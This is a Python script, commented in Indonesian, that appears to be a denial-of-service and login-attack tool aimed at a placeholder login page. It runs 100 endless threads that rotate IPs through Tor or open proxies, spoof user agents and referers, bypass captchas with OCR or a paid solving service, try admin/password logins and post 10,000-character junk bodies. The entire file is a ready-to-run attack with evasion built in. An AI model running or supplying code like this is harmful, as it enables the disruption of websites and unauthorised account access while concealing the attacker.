import requests
import random
import threading
from bs4 import BeautifulSoup
from PIL import Image
import pytesseract
import socks
import socket
import time
from fake_useragent import UserAgent
import os

# Konfigurasi
TARGET_URL = "https://target.com/login"  # Ganti dengan target
USE_TOR = True  # Pakai Tor untuk rotasi IP
USE_2CAPTCHA = False  # Butuh API Key
THREADS = 100  # Jangan 500 dulu biar stabil
TIMEOUT = 10

PROXIES = [
    "103.216.51.210:8080",
    "45.95.203.180:8080",
    "185.199.229.156:7492",
    # Tambahkan lebih banyak jika perlu
]

TOR_PORT = 9050
TOR_PASSWORD = "passwordmu"
CAPTCHA_API_KEY = "API_KEY_MU"

# Path Tesseract (jika error, sesuaikan)
pytesseract.pytesseract.tesseract_cmd = "/usr/bin/tesseract"

def solve_captcha(html_content):
    soup = BeautifulSoup(html_content, 'html.parser')
    captcha_img = soup.find("img", {"class": "captcha-img"})

    if captcha_img:
        if USE_2CAPTCHA:
            captcha_url = captcha_img["src"]
            api_url = f"http://2captcha.com/in.php?key={CAPTCHA_API_KEY}&method=base64&body={captcha_url}"
            response = requests.get(api_url)
            captcha_id = response.text.split("|")[1]
            time.sleep(5)
            result = requests.get(f"http://2captcha.com/res.php?key={CAPTCHA_API_KEY}&action=get&id={captcha_id}")
            return result.text
        else:
            img_data = requests.get(captcha_img["src"]).content
            with open("captcha.jpg", "wb") as f:
                f.write(img_data)
            try:
                text = pytesseract.image_to_string(Image.open("captcha.jpg"))
                os.remove("captcha.jpg")
                return text.strip()
            except Exception as e:
                print(f"OCR error: {e}")
    return None

def rotate_proxy():
    if USE_TOR:
        try:
            # Atur koneksi default ke socks5 (Tor)
            socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", TOR_PORT)
            socket.socket = socks.socksocket
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect(("127.0.0.1", 9051))  # control port
                s.send(f'AUTHENTICATE "{TOR_PASSWORD}"\r\nSIGNAL NEWNYM\r\n'.encode())
                s.recv(1024)
        except Exception as e:
            print(f"Tor error: {e}")
        return None
    else:
        proxy = random.choice(PROXIES)
        return {"http": f"http://{proxy}", "https": f"http://{proxy}"}

def flood():
    session = requests.Session()
    ua = UserAgent()

    headers = {
        "User-Agent": ua.random,
        "Referer": f"https://www.google.com/search?q={random.randint(1000,9999)}",
        "Accept-Language": "en-US,en;q=0.9",
    }

    while True:
        try:
            proxy = rotate_proxy()
            response = session.get(
                TARGET_URL,
                headers=headers,
                proxies=proxy,
                timeout=TIMEOUT
            )

            if "captcha" in response.text.lower():
                captcha_solution = solve_captcha(response.text)
                if captcha_solution:
                    post_data = {
                        "username": "admin",
                        "password": "password",
                        "captcha": captcha_solution
                    }
                    session.post(TARGET_URL, data=post_data, proxies=proxy)

            session.post(TARGET_URL, data={"junk": "A" * 10000}, proxies=proxy)

        except Exception as e:
            print(f"[ERROR] {e}")
            continue

# Jalankan thread
for _ in range(THREADS):
    threading.Thread(target=flood, daemon=True).start()

# Agar program tetap hidup
while True:
    time.sleep(1)
